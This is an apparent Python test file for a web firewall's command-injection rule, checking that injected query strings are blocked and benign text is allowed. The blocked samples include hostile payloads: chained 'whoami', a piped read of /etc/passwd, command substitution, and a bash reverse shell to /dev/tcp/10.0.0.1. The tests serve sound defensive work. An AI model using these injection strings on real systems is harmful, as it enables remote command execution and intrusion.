from bastion.core.normalizer import normalize_request
from bastion.rules.command_injection import CommandInjectionRule


def _match(query_string="", body=b"", headers=None, path="/"):
    request = normalize_request(
        "GET",
        path=path,
        query_string=query_string,
        headers=headers or {},
        body=body,
    )
    return CommandInjectionRule().match(request)


def test_rce_chained_whoami_blocked():
    verdict = _match(query_string="ip=127.0.0.1; whoami")
    assert verdict.blocked
    assert verdict.rule_id == "932100"


def test_rce_piped_cat_passwd_blocked():
    verdict = _match(query_string="domain=example.com | cat /etc/passwd")
    assert verdict.blocked
    assert verdict.rule_id == "932100"


def test_rce_command_substitution_blocked():
    verdict = _match(query_string="input=$(id)")
    assert verdict.blocked
    assert verdict.rule_id == "932100"


def test_rce_backticks_blocked():
    verdict = _match(query_string="user=`uname -a`")
    assert verdict.blocked
    assert verdict.rule_id == "932100"


def test_rce_system_execution_sink_blocked():
    verdict = _match(query_string="code=system('ls -la')")
    assert verdict.blocked
    assert verdict.rule_id == "932100"


def test_rce_reverse_shell_blocked():
    verdict = _match(query_string="cmd=bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
    assert verdict.blocked
    assert verdict.rule_id == "932100"


def test_rce_clean_command_allowed():
    verdict = _match(query_string="search=how+to+use+python+system&page=1")
    assert not verdict.blocked


def test_rce_no_false_positive_on_semicolons_in_text():
    # Semicolon in normal English description
    verdict = _match(query_string="note=Please+keep+in+touch;+we+will+review+item+later")
    assert not verdict.blocked

